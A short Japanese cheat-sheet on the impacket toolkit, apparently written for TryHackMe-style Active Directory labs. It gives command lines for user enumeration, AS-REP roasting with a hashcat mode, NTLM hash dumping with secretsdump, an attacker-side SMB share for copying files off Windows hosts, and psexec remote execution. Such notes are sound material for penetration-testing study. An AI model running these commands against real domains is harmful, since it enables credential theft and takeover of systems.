# impacket

全然まとまっていないので、今後整理する

0.9.20 以降不安定なため、0.9.19 推奨。

https://github.com/fortra/impacket/releases/tag/impacket_0_9_19

```
cd /opt

https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
からコンパイル済みパッケージをダウンロード

cd Impacket-0.9.19 /opt/impacket

pip install .
これにより必要な依存関係がすべてインストール
```

### ユーザー名列挙

```sh
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$TARGET
```

```sh
# ASREPRoasting攻撃 によるチケット取得。その後ハッシュをクラック。
# hashcat -m 18200 ./hash.txt ./passwords.txt
python3 /home/kali/tools/impacket/examples/GetNPUsers.py 'THM-AD/' -usersfile names.txt -no-pass -dc-ip 10.10.249.47
```

```sh
# NTLM ハッシュ抽出
python3 /home/kali/tools/impacket/examples/secretsdump.py -just-dc-ntlm THM-AD/backup@10.10.249.47
```

### ファイル共有設定（kali）

```shell
# kali側で共有設定。user,passwordはWindows側の認証情報。
# username と password は省略可
$ mkdir share
$ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username <user> -password <password> public share

# Windows側からコピー
copy <file> \\<ip>\public\
```

### パスワードハッシュ抽出

```sh
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### AS-REP Roasting

```sh
python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.194.124 controller.local/ -usersfile users.txt
```

## psexec

SMB接続できる、かつAdministratorグループに属することが必要。`ADMIN$` 共有への書き込みが必要なため。

```sh
python3 /usr/share/doc/python3-impacket/examples/psexec.py  <user>@windcorp.thm
```
